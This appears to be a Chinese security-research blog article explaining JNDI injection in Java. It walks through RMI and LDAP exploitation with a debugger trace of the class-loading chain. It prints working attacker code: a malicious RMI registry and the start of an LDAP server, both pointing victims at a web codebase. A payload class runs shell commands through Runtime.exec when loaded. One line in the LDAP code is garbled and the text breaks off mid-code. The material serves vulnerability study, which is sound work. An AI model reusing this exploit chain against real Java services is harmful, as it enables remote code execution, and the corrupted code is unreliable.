**作者： 天融信阿尔法实验室**  
**原文链接：**
### 一、前言
在漏洞挖掘或利用的时候经常会遇见JNDI,本文会讲述什么是JNDI、JNDI中RMI的利用、LDAP的利用、JDK 8u191之后的利用方式。
### 二、JNDI简介
JNDI（The Java Naming and Directory
Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。
这些命名/目录服务提供者:
  * RMI (JAVA远程方法调用)
  * LDAP (轻量级目录访问协议)
  * CORBA (公共对象请求代理体系结构)
  * DNS (域名服务)
JNDI客户端调用方式
    //指定需要查找name名称
    String jndiName= "jndiName";
    //初始化默认环境
    Context context = new InitialContext();
    //查找该name的数据
    context.lookup(jndiName);
这里的jndiName变量的值可以是上面的命名/目录服务列表里面的值,如果JNDI名称可控的话可能会被攻击。
### 三、JNDI利用方式
#### RMI的利用
RMI是Java远程方法调用,是Java编程语言里,一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。想了解RMI的可以看下[这篇文章
](https://paper.seebug.org/1194/)
攻击者代码
    public static void main(String[] args) throws Exception {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference aa = new Reference("Calc", "Calc", "http://127.0.0.1:8081/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
            registry.bind("hello", refObjWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
用web服务器来加载字节码,保存下面的这个java文件,用javac编译成.class字节码文件,在上传到web服务器上面。
    import java.lang.Runtime;
    import java.lang.Process;
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.util.Hashtable;
    public class Calc implements ObjectFactory {
        {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc2"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
        static {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc1"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
        public Calc() {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc3"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
        }
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) {
            try {
                Runtime rt = Runtime.getRuntime();
                String[] commands = {"touch", "/tmp/Calc4"};
                Process pc = rt.exec(commands);
                pc.waitFor();
            } catch (Exception e) {
                // do nothing
            }
            return null;
        }
    }
被攻击者代码
    public static void main(String[] args) {
        try {
            String uri = "rmi://127.0.0.1:1099/hello";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
我这里使用jdk`1.8.0_102`版本运行之后,/tmp/目录下四个文件都会被创建,DEBUG看下原因。
`javax.naming.InitialContext#getURLOrDefaultInitCtx`
343行getURLScheme方法解析协议名称,在345行NamingManager.getURLContext方法返回解析对应协议的对象
`com.sun.jndi.toolkit.url.GenericURLContext#lookup`
`com.sun.jndi.rmi.registry.RegistryContext#lookup`
这里会去RMI注册中心寻找hello对象,接着看下当前类的`decodeObject`方法
因为`ReferenceWrapper`对象实现了`RemoteReference`接口,所以会调用`getReference`方法会获取`Reference`对象
`javax.naming.spi.NamingManager#getObjectFactoryFromReference`
146行尝试从本地CLASSPATH获取该class,158行根据factoryName和codebase加载远程的class,跟进看下158行loadClass方法的实现
`com.sun.naming.internal.VersionHelper12#loadClass`
        public Class loadClass(String className, String codebase)
                throws ClassNotFoundException, MalformedURLException {
            ClassLoader parent = getContextClassLoader();
            ClassLoader cl =
                     URLClassLoader.newInstance(getUrlArray(codebase), parent);
            return loadClass(className, cl);
        }
        Class loadClass(String className, ClassLoader cl)
            throws ClassNotFoundException {
            Class cls = Class.forName(className, true, cl);
            return cls;
        }
这里是通过URLClassLoader去加载远程类,此时观察web服务器日志会发现一条请求记录
因为static在类加载的时候就会执行,所以这里会执行`touch /tmp/Calc1`命令,ls查看下.
`javax.naming.spi.NamingManager#getObjectFactoryFromReference`163行执行`clas.newInstance()`的时候,代码块和无参构造方法都会执行,此时`Calc2`和`Calc3`文件都会创建成功,ls看下
`javax.naming.spi.NamingManager#getObjectInstance`
321行会调用`getObjectInstance`方法,此时`Calc4`文件会被创建,ls看下
列下调用栈
    getObjectInstance:321, NamingManager (javax.naming.spi)
    decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:124, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:417, InitialContext (javax.naming)
    main:46, HelloClient
这里总结下,加载远程类的时候static静态代码块,代码块,无参构造函数和getObjectInstance方法都会被调用.
我把jdk换成`1.8.0_181`版本看下
直接运行会提示这样的一个错误
看下`com.sun.jndi.rmi.registry.RegistryContext.decodeObject`代码
354行var8是Reference对象,getFactoryClassLocation()方法是获取classFactoryLocation地址,这两个都不等于null,后面的trustURLCodebase取反,看下trustURLCodebase变量值
在当前类静态代码块定义了trustURLCodebase的值为false,那么这一个条件也成立,所以会抛出错误。
在jdk`8u121` `7u131`
`6u141`版本开始默认com.sun.jndi.rmi.object.trustURLCodebase设置为false,rmi加载远程的字节码不会执行成功。
#### LDAP的利用
LDAP是基于X.500标准的轻量级目录访问协议,目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。
攻击者代码
先下载LDAP SDK依赖,然后启动LDAP服务
    public class Ldap {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main(String[] argsx) {
            String[] args = new String[]{"http://127.0.0.1:8081/#Calc", "9999"};
            int port = 0;
            if (args.length  []"); //$NON-NLS-1$
                System.exit(-1);
            } else if (args.length > 1) {
                port = Integer.parseInt(args[1]);
            }
            try {
                InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                config.setListenerConfigs(new InMemoryListenerConfig(
                        "listen", //$NON-NLS-1$
                        InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()));
                config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
                InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                ds.startListening();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
            private URL codebase;
            /**
             *
             */
            public OperationInterceptor(URL cb) {
                this.codebase = cb;
            }
            /**
             * {@inheritDoc}
             *
             * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
             */
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                } catch (Exception e1) {
                    e1.printStackTrace();
                }